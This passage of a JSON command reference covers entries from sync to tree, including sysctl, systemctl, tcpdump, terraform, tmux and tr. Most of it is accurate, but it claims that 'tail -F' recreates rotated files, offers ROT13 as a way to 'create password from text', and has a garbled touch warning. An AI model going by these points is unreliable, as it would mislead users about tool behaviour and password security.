        "relationship": "related",
        "reason": "fsync is system call version for specific file descriptors"
      }
    ],
    "warnings": [
      "Modern filesystems usually handle sync automatically",
      "Important before unmounting or system shutdown",
      "Doesn't guarantee data is physically written (depends on drive)"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/sync.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/sync.html"
      },
      {
        "platform": "windows",
        "url": "PowerShell: Write-VolumeCache"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sysctl",
    "subtitle": "System Control",
    "description": "Configure kernel parameters at runtime for system tuning",
    "examples": [
      "sysctl -a  # Display all available kernel parameters",
      "sudo sysctl vm.swappiness=10  # Set swappiness to 10 (temporary until reboot)",
      "sudo sysctl -p /etc/sysctl.conf  # Load kernel parameters from configuration file",
      "sysctl net.ipv4.ip_forward  # Show current value of IP forwarding parameter",
      "sudo sysctl -w net.ipv4.ip_forward=1  # Enable IP packet forwarding",
      "sudo sysctl -w fs.file-max=65536  # Increase system-wide file descriptor limit"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "sysctl [options] variable[=value]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Network performance tuning",
        "commands": "sudo sysctl -w net.core.rmem_max=16777216 && sudo sysctl -w net.core.wmem_max=16777216",
        "explanation": "Increase network buffer sizes for performance",
        "title": "sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "tuned",
        "relationship": "alternative",
        "reason": "Dynamic system tuning daemon"
      }
    ],
    "warnings": [
      "Changes are temporary unless added to /etc/sysctl.conf",
      "Some parameters require reboot to take effect"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/sysctl.8.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "systemctl",
    "subtitle": "System Control",
    "description": "Control systemd services and system state",
    "examples": [
      "sudo systemctl start nginx  # Start the nginx service",
      "sudo systemctl stop nginx  # Stop the nginx service",
      "sudo systemctl restart nginx  # Restart the nginx service (stop then start)",
      "systemctl status nginx  # Show detailed status of nginx service",
      "sudo systemctl enable nginx  # Configure nginx to start automatically at boot",
      "sudo systemctl disable nginx  # Prevent nginx from starting automatically at boot",
      "systemctl list-units --type=service  # Show all systemd services and their status",
      "sudo systemctl reload nginx  # Reload service configuration without restarting"
    ],
    "platform": [
      "linux"
    ],
    "category": "system",
    "safety": "caution",
    "syntaxPattern": "systemctl [command] [service]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Service deployment workflow",
        "commands": "sudo systemctl stop myapp && sudo systemctl start myapp && systemctl status myapp",
        "explanation": "Stop, start, and check status of custom application",
        "title": "sudo && sudo && systemctl"
      }
    ],
    "relatedCommands": [
      {
        "name": "service",
        "relationship": "predecessor",
        "reason": "service command was used before systemd"
      },
      {
        "name": "journalctl",
        "relationship": "combo",
        "reason": "journalctl shows logs for systemd services"
      }
    ],
    "warnings": [
      "systemd-only, not available on non-systemd systems",
      "Enable vs start: enable affects boot behavior, start affects current state",
      "Some commands require root privileges"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/systemctl.1.html"
      },
      {
        "platform": "macos",
        "url": "Not available (use launchctl)"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "systemd-timer",
    "subtitle": "systemd Timer",
    "description": "Create and manage systemd timer units for scheduled tasks",
    "examples": [
      "systemctl list-timers  # Show all systemd timers and their next run times",
      "sudo systemctl start backup.timer  # Start the backup timer unit",
      "sudo systemctl enable backup.timer  # Enable backup timer to start automatically at boot",
      "systemctl status backup.timer  # Display detailed status of backup timer",
      "systemctl show backup.timer  # Display all properties of backup timer unit"
    ],
    "platform": [
      "linux"
    ],
    "category": "automation",
    "safety": "caution",
    "syntaxPattern": "systemctl [options] <command> timer-name.timer",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Timer deployment workflow",
        "commands": "sudo systemctl daemon-reload && sudo systemctl enable backup.timer && sudo systemctl start backup.timer && systemctl status backup.timer",
        "explanation": "Reload config, enable timer, start timer, check status",
        "title": "sudo && sudo && sudo && systemctl"
      }
    ],
    "relatedCommands": [
      {
        "name": "systemctl",
        "relationship": "combo",
        "reason": "Manage systemd timer units"
      },
      {
        "name": "crontab",
        "relationship": "alternative",
        "reason": "Traditional cron scheduling"
      }
    ],
    "warnings": [
      "Requires both .timer and .service files",
      "More complex than cron but more powerful"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.freedesktop.org/software/systemd/man/systemd.timer.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "tail",
    "subtitle": "tail",
    "description": "Display last lines of files, often used to monitor logs",
    "examples": [
      "tail -f /var/log/system.log  # Follow log file and show new entries as they appear",
      "tail -50 error.log  # Show last 50 lines to see recent issues",
      "tail -f app.log error.log  # Follow multiple files simultaneously",
      "tail -20 data.txt | cat -n  # Display last 20 lines with line numbers"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "tail [options] [file]...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Follow logs and filter errors",
        "commands": "tail -f app.log | grep ERROR",
        "explanation": "Monitor log file and only show error lines",
        "title": "tail | grep"
      },
      {
        "scenario": "Rotate through multiple log files",
        "commands": "tail -f *.log",
        "explanation": "Monitor all log files in current directory",
        "title": "tail"
      }
    ],
    "relatedCommands": [
      {
        "name": "head",
        "relationship": "opposite",
        "reason": "Shows beginning of files instead of end"
      },
      {
        "name": "less",
        "relationship": "alternative",
        "reason": "Use less +F for more interactive log following"
      }
    ],
    "warnings": [
      "tail -f keeps running until you press Ctrl+C",
      "Default is 10 lines if no number specified",
      "tail -F recreates file if it's rotated/deleted"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/tail.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/tail.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "tar",
    "subtitle": "tape archive",
    "description": "Archive and compress files and directories",
    "examples": [
      "tar -czf backup.tar.gz project/  # Create gzip-compressed archive of directory",
      "tar -xzf backup.tar.gz  # Extract gzip-compressed archive to current directory",
      "tar -tzf backup.tar.gz  # Show files in archive without extracting",
      "tar -xzf archive.tar.gz -C /opt/  # Extract archive to specified directory",
      "tar -czf backup.tar.gz --exclude='*.log' project/  # Archive directory but skip log files",
      "tar -rf existing.tar newfile.txt  # Append file to existing uncompressed archive"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "tar [options] <archive> [files...]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Backup with date in filename",
        "commands": "tar -czf backup-$(date +%Y%m%d).tar.gz ~/important/",
        "explanation": "Create dated backup archive",
        "title": "tar"
      },
      {
        "scenario": "Extract and show progress",
        "commands": "tar -xzf large-archive.tar.gz --verbose",
        "explanation": "Extract archive with detailed progress output",
        "title": "tar"
      }
    ],
    "relatedCommands": [
      {
        "name": "zip",
        "relationship": "alternative",
        "reason": "More common on Windows, better cross-platform compatibility"
      },
      {
        "name": "gzip",
        "relationship": "combo",
        "reason": "tar often uses gzip for compression"
      },
      {
        "name": "find",
        "relationship": "combo",
        "reason": "Find files to include in archives"
      }
    ],
    "warnings": [
      "Order of options matters: -czf not -fcz",
      "Archives don't preserve absolute paths by default",
      "Be careful with -P flag (preserves absolute paths)"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/tar.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/tar.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/tar/manual/"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL or Git Bash"
    }
  },
  {
    "name": "tcpdump",
    "subtitle": "TCP Dump",
    "description": "Advanced network packet capture and analysis tool",
    "examples": [
      "sudo tcpdump -i eth0 tcp port 22  # Capture SSH traffic on eth0 interface",
      "sudo tcpdump -i any -X -s 0 port 80  # Capture HTTP packets with hex and ASCII output",
      "sudo tcpdump -i eth0 -w capture.pcap -C 100 -W 5  # Save to file, rotate at 100MB, keep 5 files",
      "sudo tcpdump -i any -n port 53  # Monitor DNS traffic without hostname resolution",
      "sudo tcpdump -i any host 192.168.1.100 and host 192.168.1.200  # Capture traffic between two specific hosts",
      "sudo tcpdump -i eth0 -l | grep -E '(GET|POST)'  # Monitor HTTP requests in real-time"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "security",
    "safety": "caution",
    "syntaxPattern": "tcpdump [options] [filter]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete network forensics",
        "commands": "sudo tcpdump -i any -w evidence.pcap -s 0 && wireshark evidence.pcap",
        "explanation": "Capture full packets to file then analyze with Wireshark",
        "title": "sudo && wireshark"
      }
    ],
    "relatedCommands": [
      {
        "name": "wireshark",
        "relationship": "combo",
        "reason": "GUI tool for analyzing tcpdump captures"
      },
      {
        "name": "tshark",
        "relationship": "similar",
        "reason": "Command-line version of Wireshark"
      }
    ],
    "warnings": [
      "Requires root privileges for most operations",
      "Can capture sensitive data"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/tcpdump.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "tee",
    "subtitle": "T-shaped pipe fitting",
    "description": "Write output to both file and stdout",
    "examples": [
      "command | tee output.log  # Save command output to file and display on screen",
      "command | tee -a logfile.txt  # Append output to existing file instead of overwriting",
      "command | tee file1.txt file2.txt  # Write output to multiple files simultaneously",
      "command | tee -i output.log >/dev/null  # Save to file but don't display on screen",
      "command | tee intermediate.log | process_further  # Save intermediate results while continuing pipeline"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "tee [options] [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Logging and processing",
        "commands": "make 2>&1 | tee build.log | grep -i error",
        "explanation": "Log build output and simultaneously check for errors",
        "title": "make >& 1 | tee | grep"
      }
    ],
    "relatedCommands": [
      {
        "name": "split",
        "relationship": "similar-concept",
        "reason": "Both split output streams, tee to multiple destinations"
      }
    ],
    "warnings": [
      "Essential for logging while maintaining pipeline flow",
      "Can write to multiple files simultaneously",
      "Useful for debugging complex pipelines"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/tee.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/tee.html"
      },
      {
        "platform": "windows",
        "url": "PowerShell: Tee-Object cmdlet"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "telegraf",
    "subtitle": "Telegraf Metrics Agent",
    "description": "Plugin-driven agent for collecting and reporting metrics",
    "examples": [
      "telegraf  # Run Telegraf with default configuration",
      "telegraf --config /etc/telegraf/telegraf.conf  # Run with custom configuration file",
      "telegraf --test  # Test configuration and show sample metrics",
      "telegraf config > telegraf.conf  # Generate sample configuration file",
      "telegraf --once  # Collect metrics once and exit"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "telegraf [commands|flags]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Debug metrics collection",
        "commands": "telegraf --config telegraf.conf --test --debug",
        "explanation": "Test configuration with debug output",
        "title": "telegraf"
      }
    ],
    "relatedCommands": [
      {
        "name": "influxdb",
        "relationship": "combo",
        "reason": "Telegraf commonly sends metrics to InfluxDB"
      },
      {
        "name": "prometheus",
        "relationship": "combo",
        "reason": "Telegraf can expose Prometheus format metrics"
      }
    ],
    "warnings": [
      "Plugin configuration varies widely",
      "Some plugins require specific permissions",
      "Default collection interval is 10 seconds"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://docs.influxdata.com/telegraf/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "terraform",
    "subtitle": "Terraform (Advanced)",
    "description": "Infrastructure as Code tool for building, changing, and versioning infrastructure",
    "examples": [
      "terraform init -backend-config='bucket=my-terraform-state' -backend-config='key=prod/terraform.tfstate' -backend-config='region=us-east-1'  # Initialize with S3 backend for state management",
      "terraform workspace new production  # Create separate workspace for environment isolation",
      "terraform plan -var-file='prod.tfvars' -out=tfplan  # Generate execution plan using environment-specific variables",
      "terraform apply tfplan  # Execute previously created plan file",
      "terraform import aws_instance.web i-1234567890abcdef0  # Import existing AWS instance into Terraform state",
      "terraform refresh  # Update state file with real infrastructure",
      "terraform apply -target=aws_instance.web -target=aws_security_group.web  # Apply changes only to specified resources",
      "terraform state list && terraform state show aws_instance.web  # List resources in state and show specific resource details",
      "terraform graph | dot -Tsvg > graph.svg  # Create visual dependency graph of infrastructure",
      "terraform force-unlock 1234-5678-9012  # Remove stuck state lock (use with extreme caution)"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "automation",
    "safety": "safe",
    "syntaxPattern": "terraform [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Safe production deployment",
        "commands": "terraform workspace select production && terraform plan -var-file=prod.tfvars -out=prod.tfplan && terraform apply prod.tfplan",
        "explanation": "Switch to production workspace, plan, and apply changes safely",
        "title": "terraform && terraform && terraform"
      },
      {
        "scenario": "Multi-environment workflow",
        "commands": "terraform workspace list && terraform workspace select staging && terraform plan -destroy -var-file=staging.tfvars",
        "explanation": "List workspaces, switch to staging, and plan destruction",
        "title": "terraform && terraform && terraform"
      },
      {
        "scenario": "Complete infrastructure deployment",
        "commands": "terraform init && terraform plan && terraform apply -auto-approve",
        "explanation": "Initializes, plans, and applies infrastructure changes automatically",
        "title": "terraform && terraform && terraform"
      },
      {
        "scenario": "Validate and format configuration",
        "commands": "terraform validate && terraform fmt",
        "explanation": "Validates configuration syntax and formats files",
        "title": "terraform && terraform"
      }
    ],
    "relatedCommands": [
      {
        "name": "aws",
        "relationship": "combo",
        "reason": "Terraform AWS provider uses AWS CLI credentials"
      },
      {
        "name": "terragrunt",
        "relationship": "alternative",
        "reason": "Wrapper tool for Terraform with additional features"
      },
      {
        "name": "ansible",
        "relationship": "complement",
        "reason": "Terraform provisions infrastructure, Ansible configures it"
      },
      {
        "name": "kubectl",
        "relationship": "complement",
        "reason": "Terraform can provision Kubernetes clusters managed by kubectl"
      }
    ],
    "warnings": [
      "State locks prevent concurrent modifications",
      "Provider version constraints prevent incompatibility",
      "Workspace isolation important for multi-environment setups",
      "Import requires exact resource configuration match"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://developer.hashicorp.com/terraform/docs"
      },
      {
        "platform": "macos",
        "url": "https://developer.hashicorp.com/terraform/docs"
      },
      {
        "platform": "windows",
        "url": "https://developer.hashicorp.com/terraform/docs"
      }
    ],
    "distroNotes": {
      "linux": "Available as binary download or through package managers",
      "windows": "Available as binary download or through Chocolatey",
      "macos": "Available through Homebrew or binary download"
    }
  },
  {
    "name": "testssl",
    "subtitle": "Test SSL",
    "description": "SSL/TLS configuration testing tool for security assessment",
    "examples": [
      "testssl.sh example.com  # Comprehensive SSL/TLS security test of website",
      "testssl.sh --vulnerabilities example.com  # Test for known SSL/TLS vulnerabilities",
      "testssl.sh --server-defaults example.com  # Analyze server certificate and configuration",
      "testssl.sh --protocols --ciphers example.com  # Test supported protocols and cipher suites"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "testssl.sh [options] <host:port>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete SSL assessment",
        "commands": "testssl.sh --all --htmlfile ssl_report.html example.com",
        "explanation": "Full SSL test with HTML report generation",
        "title": "testssl"
      }
    ],
    "relatedCommands": [
      {
        "name": "sslscan",
        "relationship": "similar",
        "reason": "Alternative SSL/TLS scanner"
      },
      {
        "name": "openssl",
        "relationship": "combo",
        "reason": "Used internally for SSL testing"
      }
    ],
    "warnings": [
      "Requires bash shell and common Unix utilities",
      "May take time for comprehensive scans",
      "Some tests may not work with all server configurations"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://testssl.sh/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "time",
    "subtitle": "Time",
    "description": "Measure execution time and resource usage of programs",
    "examples": [
      "time ./myprogram  # Measure execution time of program",
      "/usr/bin/time -v ./myprogram  # Show detailed resource usage statistics (GNU time)",
      "/usr/bin/time -f 'Real: %e User: %U System: %S' ./myprogram  # Customize timing output format",
      "/usr/bin/time -o timing.txt ./myprogram  # Save timing information to file",
      "/usr/bin/time -f 'Max RSS: %M KB' ./myprogram  # Show maximum resident set size (memory usage)"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "time [options] command",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Performance comparison",
        "commands": "time ./version1 && time ./version2 && echo 'Compare the results above'",
        "explanation": "Compare execution time of two program versions",
        "title": "time && time && echo"
      }
    ],
    "relatedCommands": [
      {
        "name": "perf",
        "relationship": "advanced-alternative",
        "reason": "perf provides more detailed performance profiling"
      },
      {
        "name": "hyperfine",
        "relationship": "modern-alternative",
        "reason": "hyperfine provides statistical benchmarking"
      }
    ],
    "warnings": [
      "Shell builtin vs GNU time (/usr/bin/time) have different features",
      "Real time includes I/O wait and system load delays",
      "User + System time should be close to Real time on dedicated system"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/time.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/time.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/time"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "timeout",
    "subtitle": "Timeout",
    "description": "Run command with time limit",
    "examples": [
      "timeout 30s long_running_command  # Kill command after 30 seconds",
      "timeout 5m backup_script.sh  # Kill backup script after 5 minutes",
      "timeout -s KILL 10s problematic_command  # Use KILL signal instead of default TERM",
      "timeout --preserve-status 60s test_command  # Return command's exit status even if timed out"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "timeout [options] duration command",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Network connectivity test",
        "commands": "timeout 10s ping -c 5 google.com || echo 'Network test failed'",
        "explanation": "Test network connectivity with timeout fallback",
        "title": "timeout || echo"
      }
    ],
    "relatedCommands": [
      {
        "name": "kill",
        "relationship": "backend",
        "reason": "timeout uses kill to terminate processes"
      },
      {
        "name": "sleep",
        "relationship": "complementary",
        "reason": "sleep waits, timeout limits waiting"
      }
    ],
    "warnings": [
      "Essential for preventing runaway processes",
      "Different signals can be sent (TERM, KILL, etc.)",
      "Useful in scripts and automation"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/timeout.1.html"
      },
      {
        "platform": "macos",
        "url": "Install via homebrew: brew install coreutils"
      },
      {
        "platform": "windows",
        "url": "PowerShell: Start-Process -TimeoutSec"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "tmux",
    "subtitle": "terminal multiplexer",
    "description": "Terminal multiplexer for managing multiple terminal sessions",
    "examples": [
      "tmux new-session -s development  # Create new named session called 'development'",
      "tmux list-sessions  # Show all running tmux sessions",
      "tmux attach-session -t development  # Connect to session named 'development'",
      "tmux new-window -n 'logs'  # Create new window with name 'logs' in current session",
      "tmux split-window -v  # Split current window into top and bottom panes",
      "tmux split-window -h  # Split current window into left and right panes",
      "tmux kill-session -t development  # Terminate session named 'development'"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "tmux [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Create session with multiple windows",
        "commands": "tmux new-session -s work -d && tmux new-window -t work:1 -n 'editor' && tmux new-window -t work:2 -n 'server' && tmux attach-session -t work",
        "explanation": "Creates session with multiple named windows and attaches to it",
        "title": "tmux && tmux && tmux && tmux"
      },
      {
        "scenario": "Development environment setup",
        "commands": "tmux new-session -d -s dev && tmux send-keys -t dev:0 'cd ~/project && vim' Enter && tmux split-window -t dev:0 -v && tmux attach -t dev",
        "explanation": "Create session, open vim in project, add terminal pane below",
        "title": "tmux && tmux && vim && tmux && tmux"
      },
      {
        "scenario": "Monitor multiple log files",
        "commands": "tmux new-session -d 'tail -f /var/log/syslog' && tmux split-window -v 'tail -f /var/log/nginx/access.log' && tmux attach",
        "explanation": "Create session monitoring two log files in split panes",
        "title": "tmux && tmux && tmux"
      }
    ],
    "relatedCommands": [
      {
        "name": "screen",
        "relationship": "alternative",
        "reason": "Older terminal multiplexer with similar features"
      },
      {
        "name": "byobu",
        "relationship": "alternative",
        "reason": "Wrapper around tmux/screen with additional features"
      },
      {
        "name": "ssh",
        "relationship": "combo",
        "reason": "Often used together for persistent remote sessions"
      }
    ],
    "warnings": [
      "Default prefix key is Ctrl+b (not Ctrl+a like screen)",
      "Sessions persist after disconnection but not after system reboot",
      "Nested tmux sessions can be confusing"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/tmux.1.html"
      },
      {
        "platform": "macos",
        "url": "https://github.com/tmux/tmux/wiki"
      },
      {
        "platform": "generic",
        "url": "https://github.com/tmux/tmux/wiki/Getting-Started"
      }
    ],
    "distroNotes": {
      "linux": "Available in most distribution repositories",
      "windows": "Available through WSL or package managers like Chocolatey",
      "macos": "Available through Homebrew or MacPorts"
    }
  },
  {
    "name": "top",
    "subtitle": "table of processes",
    "description": "Display and update running processes in real-time",
    "examples": [
      "top  # Real-time view of CPU, memory usage and running processes",
      "top -o %MEM  # Display processes ordered by memory consumption",
      "top -u username  # Show only processes owned by specific user",
      "top -d 1  # Refresh every 1 second instead of default 3 seconds"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "top [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Log top output to file",
        "commands": "top -b -n 1 > system_snapshot.txt",
        "explanation": "Take single snapshot of system state and save to file",
        "title": "top > system_snapshot"
      }
    ],
    "relatedCommands": [
      {
        "name": "htop",
        "relationship": "alternative",
        "reason": "More user-friendly with colors and better navigation"
      },
      {
        "name": "ps",
        "relationship": "alternative",
        "reason": "Static process snapshot instead of real-time monitoring"
      },
      {
        "name": "uptime",
        "relationship": "similar",
        "reason": "Shows system load averages"
      }
    ],
    "warnings": [
      "Press 'q' to quit top",
      "Press 'k' to kill process from within top",
      "High update frequency can consume CPU"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/top.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/top.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL only"
    }
  },
  {
    "name": "touch",
    "subtitle": "touch",
    "description": "Create empty files or update file timestamps",
    "examples": [
      "touch newfile.txt  # Create empty file or update timestamp if exists",
      "touch file1.txt file2.txt file3.txt  # Create several empty files at once",
      "touch existing-file.txt  # Update access and modification timestamps to current time",
      "touch -t 202312251200 file.txt  # Set timestamp to specific date/time (YYYYMMDDhhmm)",
      "touch -r reference.txt target.txt  # Set target file timestamp to match reference file"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "touch [options] <file>...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Create files with sequence",
        "commands": "touch file{1..10}.txt",
        "explanation": "Create numbered files file1.txt through file10.txt",
        "title": "touch"
      },
      {
        "scenario": "Create and immediately edit",
        "commands": "touch script.sh && chmod +x script.sh && vim script.sh",
        "explanation": "Create file, make executable, and edit",
        "title": "touch && chmod && vim"
      }
    ],
    "relatedCommands": [
      {
        "name": "mkdir",
        "relationship": "similar",
        "reason": "Creates directories while touch creates files"
      },
      {
        "name": "ls",
        "relationship": "combo",
        "reason": "Check if files were created with touch"
      },
      {
        "name": "stat",
        "relationship": "combo",
        "reason": "View detailed file timestamps after touching"
      }
    ],
    "warnings": [
      "touch creates files even if parent directory doesn't exist may fail",
      "Touching read-only files may fail without proper permissions",
      "Timestamp format varies between systems"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/touch.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/touch.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/touch-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL or Git Bash"
    }
  },
  {
    "name": "tr",
    "subtitle": "translate",
    "description": "Translate or delete characters from input",
    "examples": [
      "echo 'hello world' | tr 'a-z' 'A-Z'  # Translate lowercase letters to uppercase",
      "tr -d '0-9' < file.txt  # Remove all digits from file content",
      "echo 'file name.txt' | tr ' ' '_'  # Replace spaces with underscores for filename",
      "echo 'hello' | tr -s 'l'  # Squeeze consecutive 'l' characters to single 'l'",
      "tr '\\n' ' ' < file.txt  # Replace newlines with spaces to join lines"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "tr [options] <set1> [set2]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Clean up CSV data",
        "commands": "tr -d '\"' < data.csv | tr ',' '\\t'",
        "explanation": "Remove quotes and convert commas to tabs",
        "title": "tr < data | tr"
      },
      {
        "scenario": "Create password from text",
        "commands": "echo 'password123' | tr 'a-zA-Z' 'n-za-mN-ZA-M'",
        "explanation": "Apply ROT13 cipher to text",
        "title": "echo | tr"
      }
    ],
    "relatedCommands": [
      {
        "name": "sed",
        "relationship": "powerful",
        "reason": "More complex text transformations and pattern matching"
      },
      {
        "name": "awk",
        "relationship": "powerful",
        "reason": "Field-based text processing"
      },
      {
        "name": "cut",
        "relationship": "combo",
        "reason": "Extract fields then translate characters"
      }
    ],
    "warnings": [
      "tr only works with stdin, not files directly",
      "Character classes like [:alpha:] are POSIX-specific",
      "Cannot handle multi-byte characters properly"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/tr.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/tr.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/tr-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "traceroute",
    "subtitle": "trace route",
    "description": "Trace the route packets take to reach a destination",
    "examples": [
      "traceroute google.com  # Show all hops between your computer and Google's servers",
      "traceroute -I example.com  # Trace route using ICMP packets (like ping)",
      "traceroute -m 15 192.168.1.1  # Limit trace to maximum 15 hops",
      "traceroute -n server.com  # Skip DNS resolution for faster results",
      "traceroute -i eth0 destination.com  # Trace from specific network interface"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "networking",
    "safety": "safe",
    "syntaxPattern": "traceroute [options] <host>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Compare routes to multiple destinations",
        "commands": "for host in google.com github.com stackoverflow.com; do echo \"Route to $host:\"; traceroute -n $host; echo; done",
        "explanation": "Trace routes to multiple destinations for comparison",
        "title": "for ; do ; traceroute ; echo ; done"
      },
      {
        "scenario": "Save traceroute results with timestamp",
        "commands": "echo \"$(date): traceroute to $1\" && traceroute -n $1 | tee traceroute_$(date +%Y%m%d_%H%M%S).log",
        "explanation": "Log traceroute results with timestamp for analysis",
        "title": "echo && traceroute | tee"
      }
    ],
    "relatedCommands": [
      {
        "name": "ping",
        "relationship": "combo",
        "reason": "Use ping to test connectivity after traceroute"
      },
      {
        "name": "mtr",
        "relationship": "alternative",
        "reason": "Combines ping and traceroute with continuous monitoring"
      },
      {
        "name": "nslookup",
        "relationship": "combo",
        "reason": "Resolve hostnames found in traceroute path"
      }
    ],
    "warnings": [
      "May require root privileges depending on packet type",
      "Some firewalls block traceroute packets",
      "Results can vary due to load balancing and routing changes"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/traceroute.8.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/traceroute.html"
      },
      {
        "platform": "generic",
        "url": "https://github.com/iputils/iputils"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "tree",
    "subtitle": "tree",
    "description": "Display directory structure in tree format",
    "examples": [
      "tree  # Display tree view of current directory and subdirectories",
      "tree -L 2  # Show only 2 levels deep in directory tree",
      "tree -a  # Include hidden files and directories in tree output",
      "tree -d  # Display directory structure without files",
      "tree -h  # Display file sizes in human-readable format",
      "tree -o structure.txt  # Save directory tree to text file"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "tree [options] [directory]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Project documentation",
